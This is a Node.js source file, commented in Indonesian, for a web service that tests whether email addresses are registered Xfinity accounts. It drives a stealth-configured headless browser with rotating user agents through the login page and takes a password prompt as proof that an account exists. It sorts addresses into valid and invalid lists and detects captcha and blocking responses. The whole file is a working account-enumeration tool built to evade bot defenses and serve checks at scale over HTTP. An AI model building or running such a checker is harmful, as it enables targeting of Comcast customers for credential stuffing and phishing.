'use strict';

const express = require('express');
const expressStatusMonitor = require('express-status-monitor');
const puppeteer = require('puppeteer-extra');
const StealthPlugin = require('puppeteer-extra-plugin-stealth');
const fs = require('fs');
const path = require('path');
const UserAgent = require('user-agents');

puppeteer.use(StealthPlugin());

// =====================================================================
// SAFETY NET: proses TIDAK akan mati walau ada error tak terduga.
// (Penyebab utama "endpoint hidup lalu mati" = unhandled rejection
//  yang membuat Node mematikan proses. Dengan handler ini server tetap
//  hidup dan error dicatat ke log.)
// =====================================================================
process.on('unhandledRejection', (err) => {
  console.error('[unhandledRejection]', err && err.stack ? err.stack : String(err));
});
process.on('uncaughtException', (err) => {
  console.error('[uncaughtException]', err && err.stack ? err.stack : String(err));
});

const colors = {
  reset: '\x1b[0m',
  green: '\x1b[32m',
  red: '\x1b[31m',
  yellow: '\x1b[33m',
};

const LOGIN_URL = process.env.LOGIN_URL || 'https://login.xfinity.com/login';
const OUT_DIR = process.env.OUT_DIR || __dirname;

// ---------------------------------------------------------------------
// Helper kecil
// ---------------------------------------------------------------------
function delay(ms) {
  return new Promise((resolve) => setTimeout(resolve, ms));
}

function getRandomUserAgent() {
  try {
    return new UserAgent({ deviceCategory: 'mobile' }).toString();
  } catch {
    return 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36';
  }
}

// Cari binary Chrome: CHROME_PATH -> google-chrome -> chromium -> bawaan puppeteer
function chromePath() {
  if (process.env.CHROME_PATH && fs.existsSync(process.env.CHROME_PATH)) {
    return process.env.CHROME_PATH;
  }
  for (const p of [
    '/usr/bin/google-chrome',
    '/usr/bin/google-chrome-stable',
    '/usr/bin/chromium',
    '/usr/bin/chromium-browser',
  ]) {
    if (fs.existsSync(p)) return p;
  }
  return undefined; // biarkan puppeteer memakai Chrome bawaan-nya
}

async function launchBrowser() {
  return puppeteer.launch({
    headless: true,
    args: [
      '--no-sandbox',
      '--disable-setuid-sandbox',
      '--disable-gpu',
      '--disable-dev-shm-usage',
      '--disable-software-rasterizer',
      '--no-zygote',
      '--disable-extensions',
      '--disable-background-timer-throttling',
      '--disable-background-networking',
      '--disable-default-apps',
      '--disable-translate',
      '--no-first-run',
    ],
    executablePath: chromePath(),
    slowMo: 40,
  });
}

async function pageText(page) {
  try {
    const body = await page.$('body');
    if (!body) return '';
    const t = await body.evaluate((el) => el.innerText || el.textContent || '');
    return (t || '').trim();
  } catch {
    return '';
  }
}

function matchAny(text, patterns) {
  const lower = (text || '').toLowerCase();
  for (const p of patterns) {
    if (lower.includes(p.toLowerCase())) return p;
  }
  return null;
}

// ---------------------------------------------------------------------
// Polling hasil setelah klik "Let's go" (pengganti waitForNavigation
// yang selalu timeout di SPA Xfinity dan membuat proses crash).
// ---------------------------------------------------------------------
async function waitOutcome(page, timeoutMs) {
  const passwordSelectors = ['#passwd', 'input[name="password"]', 'input[type="password"]'];
  const failedPatterns = [
    "we don't recognize that xfinity id",
    'the xfinity id you entered was incorrect',
    'no account found',
    'doesn\'t match our records',
  ];
  const forbiddenPatterns = [
    'access denied',
    'akamai',
    "you don't have permission to access",
    'captcha',
    'unusual traffic',
    'your account has been suspended',
    'too many requests',
  ];
  const errorPatterns = ['something went wrong', 'temporarily unavailable', 'technical difficulties'];

  const deadline = Date.now() + timeoutMs;
  let snippet = '';

  while (Date.now() < deadline) {
    for (const sel of passwordSelectors) {
      const pw = await page.$(sel).catch(() => null);
      if (pw) {
        return { status: 'SUCCESS', detail: 'password step reached' };
      }
    }

    const txt = await pageText(page);
    snippet = txt;

    const f = matchAny(txt, forbiddenPatterns);
    if (f) return { status: 'FORBIDDEN', detail: f };

    const nf = matchAny(txt, failedPatterns);
    if (nf) return { status: 'FAILED', detail: nf };

    const er = matchAny(txt, errorPatterns);
    if (er) return { status: 'ERROR', detail: er };

    // "Enter your password" = akun terdaftar (fallback teks)
    if ((txt || '').toLowerCase().includes('enter your password')) {
      return { status: 'SUCCESS', detail: 'password prompt text' };
    }

    await delay(500);
  }

  return { status: 'UNKNOWN', detail: `no decisive text: ${snippet.slice(0, 160)}` };
}

function appendResult(status, email) {
  const file = {
    SUCCESS: 'valid.txt',
    FAILED: 'bad.txt',
    FORBIDDEN: 'forbidden.txt',
    ERROR: 'bad.txt',
    UNKNOWN: 'unknown.txt',
  }[status];
  if (file) fs.appendFileSync(path.join(OUT_DIR, file), `${email}\n`);
}

// ---------------------------------------------------------------------
// Cek satu email
// ---------------------------------------------------------------------
async function checkEmail(email) {
  let browser = null;
  try {
    browser = await launchBrowser();
    const page = await browser.newPage();

    await page.setUserAgent(getRandomUserAgent());
    await page.setViewport({ width: 1366, height: 768 });

    await page.goto(LOGIN_URL, { waitUntil: 'domcontentloaded', timeout: 45000 });

    await page.waitForSelector('#user', { timeout: 20000, visible: true });
    await page.type('#user', email, { delay: 30 });
    await delay(1500);
    await page.click('#sign_in');

    const verdict = await waitOutcome(page, 45000);
    const msg =
      verdict.status === 'SUCCESS' ? colors.green : verdict.status === 'FAILED' ? colors.red : colors.yellow;
    console.log(`${msg}[${verdict.status}] ${email} (${verdict.detail})${colors.reset}`);

    appendResult(verdict.status, email);
    return { email, status: verdict.status, detail: verdict.detail };
  } catch (e) {
    const msg = String((e && e.message) || e).slice(0, 200);
    console.log(`${colors.yellow}[ERROR] ${email}: ${msg}${colors.reset}`);
    appendResult('ERROR', email);
    return { email, status: 'ERROR', message: msg };
  } finally {
    if (browser) await browser.close().catch(() => {});
  }
}

// ---------------------------------------------------------------------
// Pembatas konkurensi: maks 2 pengecekan berjalan bersamaan supaya
// VPS tidak kehabisan RAM (Chrome per request berat). Request lain
// antri, TIDAK error.
// ---------------------------------------------------------------------
const MAX_CONCURRENT = parseInt(process.env.MAX_CONCURRENT || '2', 10);
let active = 0;
const waitQueue = [];

function acquire() {
  if (active < MAX_CONCURRENT) {
    active += 1;
    return Promise.resolve();
  }
  return new Promise((resolve) => waitQueue.push(resolve));
}

function release() {
  active -= 1;
  const next = waitQueue.shift();
  if (next) {
    active += 1;
    next();
  }
}

// ---------------------------------------------------------------------
// Express
// ---------------------------------------------------------------------
const app = express();
const PORT = parseInt(process.env.PORT || '3000', 10);

// Dashboard monitoring di /monitor (jangan bentrok dengan /status health-check)
app.use(expressStatusMonitor({ path: '/monitor' }));

app.get('/status', (req, res) => {
  res.json({ ok: true, uptime: process.uptime(), activeChecks: active, queued: waitQueue.length });
});

app.get('/validator', async (req, res) => {
  const email = (req.query.email || '').trim();
  if (!email) {
    return res.status(400).json({ error: 'Email must be provided as a query parameter' });
  }

  try {
    await acquire();
    try {
      const result = await checkEmail(email);
      res.json(result);
    } finally {
      release();
    }
  } catch (e) {
    // Error handler ini memastikan request yang gagal TIDAK mematikan server
    console.error('[handler-error]', e);
    res.status(500).json({ email, status: 'ERROR', message: String((e && e.message) || e).slice(0, 200) });
  }
});

// Error middleware terakhir (jaga-jaga)
app.use((err, req, res, next) => {
  console.error('[express-error]', err);
  res.status(500).json({ error: 'internal error', message: String((err && err.message) || err).slice(0, 200) });
});

app.listen(PORT, () => {
  console.log(`Server is running on http://0.0.0.0:${PORT}`);
  console.log(`  GET /validator?email=user@comcast.net  -> cek email`);
  console.log(`  GET /status                            -> health check`);
  console.log(`  GET /monitor                           -> dashboard`);
  console.log(`  Chrome: ${chromePath() || '(bawaan puppeteer)'}`);
});
